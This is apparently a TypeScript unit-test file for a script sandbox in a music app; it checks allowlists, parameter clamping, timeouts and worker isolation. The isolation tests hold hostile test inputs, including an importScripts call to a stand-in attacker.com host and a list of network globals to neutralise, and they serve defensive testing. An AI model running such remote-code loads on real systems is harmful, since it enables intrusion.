/**
 * tests/features/script-sandbox.test.ts
 *
 * Unit-Tests für die ScriptSandbox (TASK-103 / B).
 *
 * Vitest läuft in Node — also gibt es keinen echten DOM-Worker. Wir mocken
 * deshalb die Worker-Factory der Sandbox mit Node's `worker_threads`. Der
 * MockWorker startet einen ECHTEN OS-Thread (eval:true), in dem der
 * SANDBOX_WORKER_SOURCE läuft. Dadurch:
 *   - können wir `while(true){}` testen, ohne den Test-Prozess zu blockieren
 *   - können wir `terminate()` ehrlich testen
 *   - testen wir den ECHTEN Worker-Bytecode (Härtung, Reply-Tracking,
 *     Allowlist) und nicht nur einen Stub.
 *
 * Der einzige Unterschied zu einem Browser-Web-Worker ist, dass `self` im
 * Worker-Thread nicht existiert — wir injizieren deshalb einen kleinen Shim
 * (siehe SHIM_SOURCE), der `self.postMessage` / `self.addEventListener` auf
 * `parentPort` umleitet. Die Sandbox-Härtung selbst (fetch=undefined etc.)
 * läuft unverändert.
 */
import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { Worker as NodeWorker } from "node:worker_threads";

import {
  ScriptSandbox,
  __setWorkerFactoryForTesting,
  __getSandboxWorkerSource,
  __ALLOWED_DISPATCH_ACTIONS,
  __ALLOWED_BRIDGE_METHODS,
} from "../../client/src/sandbox/useScriptSandbox";

// ─── Worker-Shim: Browser-API → worker_threads-API ──────────────────────────
//
// Dieser Shim wird VOR dem Sandbox-Source ausgeführt und stellt im
// Worker-Thread ein `self`-Objekt bereit, das dieselbe API anbietet wie
// der echte Web-Worker (postMessage, addEventListener('message', …)).
//
// Wir definieren `self` als globale Variable, weil der Sandbox-Source
// `self.fetch = undefined` etc. setzt — das setzt auf diesem `self`-Objekt
// die Properties (kein Effekt auf den Worker-Thread-Global selbst, was OK
// ist: User-Code sieht NUR `self`, nicht `globalThis`).

const SHIM_SOURCE = `
const { parentPort } = require('worker_threads');
const __selfListeners = new Map();
globalThis.self = {
  postMessage: (data) => parentPort.postMessage(data),
  addEventListener: (type, listener) => {
    let set = __selfListeners.get(type);
    if (!set) { set = new Set(); __selfListeners.set(type, set); }
    set.add(listener);
  },
  removeEventListener: (type, listener) => {
    __selfListeners.get(type)?.delete(listener);
  },
};
parentPort.on('message', (data) => {
  const listeners = __selfListeners.get('message');
  if (listeners) {
    for (const l of listeners) {
      try { l({ data }); } catch (e) { /* swallow — listener errors must not crash worker */ }
    }
  }
});
`;

type Listener = (ev: unknown) => void;

class MockWorker {
  private nodeWorker: NodeWorker;
  private terminated = false;
  private mainListeners = new Map<string, Set<Listener>>();

  constructor(source: string) {
    this.nodeWorker = new NodeWorker(SHIM_SOURCE + "\n" + source, { eval: true });
    this.nodeWorker.on("message", (data: unknown) => {
      if (this.terminated) return;
      const listeners = this.mainListeners.get("message");
      if (listeners) for (const l of listeners) l({ data });
    });
    this.nodeWorker.on("error", (err: Error) => {
      const listeners = this.mainListeners.get("error");
      if (listeners) for (const l of listeners) l({ message: err.message });
    });
    // Suppress unhandled-exit noise when we terminate() forcibly.
    this.nodeWorker.on("exit", () => { /* expected on terminate */ });
  }

  postMessage(data: unknown): void {
    if (this.terminated) return;
    this.nodeWorker.postMessage(data);
  }

  terminate(): void {
    this.terminated = true;
    void this.nodeWorker.terminate();
  }

  addEventListener(type: string, listener: Listener): void {
    let set = this.mainListeners.get(type);
    if (!set) {
      set = new Set();
      this.mainListeners.set(type, set);
    }
    set.add(listener);
  }

  removeEventListener(type: string, listener: Listener): void {
    this.mainListeners.get(type)?.delete(listener);
  }
}

const liveWorkers: MockWorker[] = [];

function installMockWorker(): void {
  __setWorkerFactoryForTesting((source: string) => {
    const w = new MockWorker(source);
    liveWorkers.push(w);
    return w;
  });
}

beforeEach(() => {
  installMockWorker();
});

afterEach(() => {
  // Belt-and-suspenders: terminate any leaked workers between tests.
  while (liveWorkers.length) {
    const w = liveWorkers.pop()!;
    try { w.terminate(); } catch { /* ignore */ }
  }
});

// ─── Tests ───────────────────────────────────────────────────────────────────

describe("ScriptSandbox – Whitelists", () => {
  it("ALLOWED_BRIDGE_METHODS contains exactly 8 methods", () => {
    expect(__ALLOWED_BRIDGE_METHODS.size).toBe(8);
    expect(__ALLOWED_BRIDGE_METHODS.has("bpm")).toBe(true);
    expect(__ALLOWED_BRIDGE_METHODS.has("setMacro")).toBe(true);
    // Sanity: anything NOT on the list:
    expect(__ALLOWED_BRIDGE_METHODS.has("readFile")).toBe(false);
    expect(__ALLOWED_BRIDGE_METHODS.has("fetch")).toBe(false);
  });

  it("ALLOWED_DISPATCH_ACTIONS contains pattern/transport actions but not destructive ones", () => {
    expect(__ALLOWED_DISPATCH_ACTIONS.has("play-stop")).toBe(true);
    expect(__ALLOWED_DISPATCH_ACTIONS.has("pattern-randomize")).toBe(true);
    expect(__ALLOWED_DISPATCH_ACTIONS.has("save")).toBe(false);
    expect(__ALLOWED_DISPATCH_ACTIONS.has("load")).toBe(false);
    expect(__ALLOWED_DISPATCH_ACTIONS.has("delete-pattern")).toBe(false);
  });

  it("Worker source neutralizes critical globals (textual integrity check)", () => {
    const src = __getSandboxWorkerSource();
    for (const g of [
      "fetch",
      "XMLHttpRequest",
      "WebSocket",
      "EventSource",
      "indexedDB",
      "caches",
      "importScripts",
      "Worker",
      "SharedWorker",
      "BroadcastChannel",
      "Notification",
      "postMessage",
    ]) {
      // Note: esbuild transpiles `undefined` to `void 0` — wir akzeptieren
      // beide Formen, weil sie semantisch identisch sind.
      const pattern = new RegExp(`self\\.${g}\\s*=\\s*(undefined|void 0)\\b`);
      expect(src, `expected neutralization of self.${g}`).toMatch(pattern);
    }
  });
});

describe("ScriptSandbox – Successful bridge calls", () => {
  it("(1) ss.bpm(140) — bridge receives method='bpm', clamped int 140, status=success", async () => {
    const bpmCalls: number[] = [];
    const sandbox = new ScriptSandbox({ setBpm: (v) => bpmCalls.push(v) });
    const result = await sandbox.run("await ss.bpm(140);", { maxRuntimeMs: 2_000 });
    expect(result.status).toBe("success");
    expect(bpmCalls).toEqual([140]);
  });

  it("(4) ss.dispatch('play-stop') — allowed action, success", async () => {
    const dispatched: string[] = [];
    const sandbox = new ScriptSandbox({ dispatchAction: (a) => dispatched.push(a) });
    const result = await sandbox.run("await ss.dispatch('play-stop');", { maxRuntimeMs: 2_000 });
    expect(result.status).toBe("success");
    expect(dispatched).toEqual(["play-stop"]);
  });

  it("(8) ss.log('hello') — log appears in result.logs (info type, truncated to 500)", async () => {
    const sandbox = new ScriptSandbox({});
    const result = await sandbox.run("await ss.log('hello');", { maxRuntimeMs: 2_000 });
    expect(result.status).toBe("success");
    const infoLogs = result.logs.filter((l) => l.type === "info");
    expect(infoLogs).toHaveLength(1);
    expect(infoLogs[0].message).toBe("hello");
  });

  it("ss.log truncates messages longer than 500 chars", async () => {
    const long = "A".repeat(1000);
    const sandbox = new ScriptSandbox({});
    const result = await sandbox.run(`await ss.log("${long}");`, { maxRuntimeMs: 2_000 });
    const infoLogs = result.logs.filter((l) => l.type === "info");
    expect(infoLogs[0].message).toHaveLength(500);
  });
});

describe("ScriptSandbox – Allowlist enforcement (security)", () => {
  it("(3) ss.dispatch('save') — DENIED with 'Unauthorized' error", async () => {
    const dispatched: string[] = [];
    const sandbox = new ScriptSandbox({ dispatchAction: (a) => dispatched.push(a) });
    const result = await sandbox.run(
      "try { await ss.dispatch('save'); } catch(e) { await ss.log('caught: ' + e.message); }",
      { maxRuntimeMs: 2_000 },
    );
    expect(result.status).toBe("success");
    expect(dispatched).toEqual([]);
    const infoLogs = result.logs.filter((l) => l.type === "info");
    expect(infoLogs[0]?.message).toMatch(/Unauthorized dispatch action/);
  });

  it("Unknown bridge method 'readFile' — DENIED via Reflect", async () => {
    // We can't call ss.readFile because the API doesn't expose it. But if user
    // code does `await ss.constructor` etc. they still can't bypass the allowlist.
    // A direct way: forge an ss-call message by abusing the same channel name.
    // Since the user has NO access to postMessage, this attack path is closed.
    // We assert the absence of the surface area:
    const sandbox = new ScriptSandbox({});
    const result = await sandbox.run(
      "await ss.log(typeof ss.readFile);",
      { maxRuntimeMs: 2_000 },
    );
    expect(result.status).toBe("success");
    expect(result.logs.find((l) => l.type === "info")?.message).toBe("undefined");
  });
});

describe("ScriptSandbox – Parameter clamping", () => {
  it("(9) ss.bpm(99999) — clamped to 300", async () => {
    const bpmCalls: number[] = [];
    const sandbox = new ScriptSandbox({ setBpm: (v) => bpmCalls.push(v) });
    const result = await sandbox.run("await ss.bpm(99999);", { maxRuntimeMs: 2_000 });
    expect(result.status).toBe("success");
    expect(bpmCalls).toEqual([300]);
  });

  it("ss.bpm(-50) — clamped to 20", async () => {
    const bpmCalls: number[] = [];
    const sandbox = new ScriptSandbox({ setBpm: (v) => bpmCalls.push(v) });
    const result = await sandbox.run("await ss.bpm(-50);", { maxRuntimeMs: 2_000 });
    expect(result.status).toBe("success");
    expect(bpmCalls).toEqual([20]);
  });

  it("ss.bpm(120.7) — rounded to int 121", async () => {
    const bpmCalls: number[] = [];
    const sandbox = new ScriptSandbox({ setBpm: (v) => bpmCalls.push(v) });
    const result = await sandbox.run("await ss.bpm(120.7);", { maxRuntimeMs: 2_000 });
    expect(bpmCalls).toEqual([121]);
  });

  it("(2) ss.bpm('not a number') — bridge rejects, status=error in script context", async () => {
    const bpmCalls: number[] = [];
    const sandbox = new ScriptSandbox({ setBpm: (v) => bpmCalls.push(v) });
    const result = await sandbox.run(
      "try { await ss.bpm('not a number'); } catch (e) { await ss.log('caught: ' + e.message); }",
      { maxRuntimeMs: 2_000 },
    );
    expect(result.status).toBe("success");
    expect(bpmCalls).toEqual([]);
    expect(result.logs.find((l) => l.type === "info")?.message).toMatch(/Expected number/);
  });

  it("(10) ss.setMacro(99, 0.5) — throws (idx out of range)", async () => {
    const macroCalls: Array<[number, number]> = [];
    const sandbox = new ScriptSandbox({ setMacroValue: (i, v) => macroCalls.push([i, v]) });
    const result = await sandbox.run(
      "try { await ss.setMacro(99, 0.5); } catch (e) { await ss.log('caught: ' + e.message); }",
      { maxRuntimeMs: 2_000 },
    );
    expect(result.status).toBe("success");
    expect(macroCalls).toEqual([]);
    expect(result.logs.find((l) => l.type === "info")?.message).toMatch(/out of range/);
  });

  it("(11) ss.setMacro(3, 99) — clamps v to 1.0", async () => {
    const macroCalls: Array<[number, number]> = [];
    const sandbox = new ScriptSandbox({ setMacroValue: (i, v) => macroCalls.push([i, v]) });
    const result = await sandbox.run("await ss.setMacro(3, 99);", { maxRuntimeMs: 2_000 });
    expect(result.status).toBe("success");
    expect(macroCalls).toEqual([[3, 1]]);
  });

  it("ss.setStep with invalid stepIdx (out of 0..63) — clamps", async () => {
    const stepCalls: Array<[string, number, boolean]> = [];
    const sandbox = new ScriptSandbox({
      setStep: (p, i, on) => stepCalls.push([p, i, on]),
    });
    const result = await sandbox.run(
      "await ss.setStep('kick', 999, true);",
      { maxRuntimeMs: 2_000 },
    );
    expect(result.status).toBe("success");
    expect(stepCalls).toEqual([["kick", 63, true]]);
  });

  it("ss.setStep with non-boolean on — throws", async () => {
    const stepCalls: Array<[string, number, boolean]> = [];
    const sandbox = new ScriptSandbox({
      setStep: (p, i, on) => stepCalls.push([p, i, on]),
    });
    const result = await sandbox.run(
      "try { await ss.setStep('kick', 0, 1); } catch (e) { await ss.log('caught: ' + e.message); }",
      { maxRuntimeMs: 2_000 },
    );
    expect(result.status).toBe("success");
    expect(stepCalls).toEqual([]);
    expect(result.logs.find((l) => l.type === "info")?.message).toMatch(/must be a boolean/);
  });
});

describe("ScriptSandbox – Errors & lifecycle", () => {
  it("(6) throw new Error('boom') — status=error, message contains 'boom'", async () => {
    const sandbox = new ScriptSandbox({});
    const result = await sandbox.run("throw new Error('boom');", { maxRuntimeMs: 2_000 });
    expect(result.status).toBe("error");
    expect(result.message ?? "").toMatch(/boom/);
  });

  it("(5) while(true){} with maxRuntimeMs=150 — status=timeout", async () => {
    const sandbox = new ScriptSandbox({});
    const result = await sandbox.run("while(true){}", { maxRuntimeMs: 150 });
    expect(result.status).toBe("timeout");
  });

  it("(7) abort() while script running — status=aborted", async () => {
    const sandbox = new ScriptSandbox({});
    const runPromise = sandbox.run(
      "await ss.wait(60000);",
      { maxRuntimeMs: 60_000 },
    );
    // Give the worker a tick to start
    await new Promise((r) => setTimeout(r, 30));
    sandbox.abort();
    const result = await runPromise;
    expect(result.status).toBe("aborted");
    expect(sandbox.isRunning()).toBe(false);
  });

  it("isRunning() reflects worker state", async () => {
    const sandbox = new ScriptSandbox({ setBpm: () => {} });
    expect(sandbox.isRunning()).toBe(false);
    const promise = sandbox.run("await ss.wait(100);", { maxRuntimeMs: 2_000 });
    // Synchronously after run() the worker exists.
    expect(sandbox.isRunning()).toBe(true);
    await promise;
    expect(sandbox.isRunning()).toBe(false);
  });

  it("run() rejects parallel runs with status=error", async () => {
    const sandbox = new ScriptSandbox({});
    const first = sandbox.run("await ss.wait(200);", { maxRuntimeMs: 2_000 });
    const second = await sandbox.run("await ss.log('hi');", { maxRuntimeMs: 2_000 });
    expect(second.status).toBe("error");
    expect(second.message).toMatch(/already running/);
    sandbox.abort();
    await first;
  });

  it("missing bridge.setBpm — ss.bpm throws inside script", async () => {
    const sandbox = new ScriptSandbox({}); // no setBpm
    const result = await sandbox.run(
      "try { await ss.bpm(140); } catch(e) { await ss.log('no-bpm: ' + e.message); }",
      { maxRuntimeMs: 2_000 },
    );
    expect(result.status).toBe("success");
    expect(result.logs.find((l) => l.type === "info")?.message).toMatch(/setBpm not available/);
  });
});

describe("ScriptSandbox – Worker isolation", () => {
  it("(12) Worker has no fetch — typeof self.fetch === 'undefined'", async () => {
    const sandbox = new ScriptSandbox({});
    const result = await sandbox.run(
      "await ss.log(typeof self.fetch);",
      { maxRuntimeMs: 2_000 },
    );
    expect(result.status).toBe("success");
    expect(result.logs.find((l) => l.type === "info")?.message).toBe("undefined");
  });

  it("Worker has no XMLHttpRequest, WebSocket, indexedDB", async () => {
    const sandbox = new ScriptSandbox({});
    const result = await sandbox.run(
      `
      await ss.log(typeof self.XMLHttpRequest);
      await ss.log(typeof self.WebSocket);
      await ss.log(typeof self.indexedDB);
      `,
      { maxRuntimeMs: 2_000 },
    );
    expect(result.status).toBe("success");
    const messages = result.logs.filter((l) => l.type === "info").map((l) => l.message);
    expect(messages).toEqual(["undefined", "undefined", "undefined"]);
  });

  it("Worker user-code cannot call self.postMessage directly", async () => {
    const sandbox = new ScriptSandbox({});
    const result = await sandbox.run(
      `
      try { self.postMessage({ type: 'evil' }); await ss.log('reached'); }
      catch (e) { await ss.log('blocked: ' + (e && e.message ? e.message : e)); }
      `,
      { maxRuntimeMs: 2_000 },
    );
    expect(result.status).toBe("success");
    const msg = result.logs.find((l) => l.type === "info")?.message ?? "";
    expect(msg).toMatch(/^blocked: /);
  });

  it("Worker user-code cannot importScripts", async () => {
    const sandbox = new ScriptSandbox({});
    const result = await sandbox.run(
      `
      try { importScripts('https://attacker.com/x.js'); await ss.log('reached'); }
      catch (e) { await ss.log('blocked: ' + (e && e.message ? e.message : e)); }
      `,
      { maxRuntimeMs: 2_000 },
    );
    expect(result.status).toBe("success");
    const msg = result.logs.find((l) => l.type === "info")?.message ?? "";
    // Either ReferenceError (not defined in VM scope) or "blocked: ..." from undefined.
    expect(msg).toMatch(/blocked: /);
  });
});

describe("ScriptSandbox – Multi-call scripts", () => {
  it("Many ss.bpm calls in sequence all reach the bridge", async () => {
    const bpmCalls: number[] = [];
    const sandbox = new ScriptSandbox({ setBpm: (v) => bpmCalls.push(v) });
    const result = await sandbox.run(
      `
      await ss.bpm(100);
      await ss.bpm(120);
      await ss.bpm(140);
      `,
      { maxRuntimeMs: 2_000 },
    );
    expect(result.status).toBe("success");
    expect(bpmCalls).toEqual([100, 120, 140]);
  });

  it("ss.getMacro returns the value provided by the bridge", async () => {
    const sandbox = new ScriptSandbox({
      getMacroValue: (idx) => (idx === 2 ? 0.42 : 0),
    });
    const result = await sandbox.run(
      `
      const v = await ss.getMacro(2);
      await ss.log("v=" + v);
      `,
      { maxRuntimeMs: 2_000 },
    );
    expect(result.status).toBe("success");
    expect(result.logs.find((l) => l.type === "info")?.message).toBe("v=0.42");
  });

  it("onLog callback fires per log entry", async () => {
    const live: string[] = [];
    const sandbox = new ScriptSandbox({});
    await sandbox.run(
      `
      await ss.log("one");
      await ss.log("two");
      await ss.log("three");
      `,
      {
        maxRuntimeMs: 2_000,
        onLog: (entry) => live.push(entry.message),
      },
    );
    expect(live).toEqual(["one", "two", "three"]);
  });
});
